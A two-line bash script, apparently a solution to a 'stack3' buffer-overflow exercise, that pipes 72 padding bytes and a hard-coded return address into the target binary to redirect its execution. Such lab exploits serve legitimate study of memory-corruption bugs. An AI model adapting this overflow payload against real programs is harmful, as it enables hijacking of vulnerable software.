#!/bin/bash
echo `python -c 'print"A"*72 + "\xb6\x05\x40\x00\x00\x00\x00\x00" '` | ./stack3
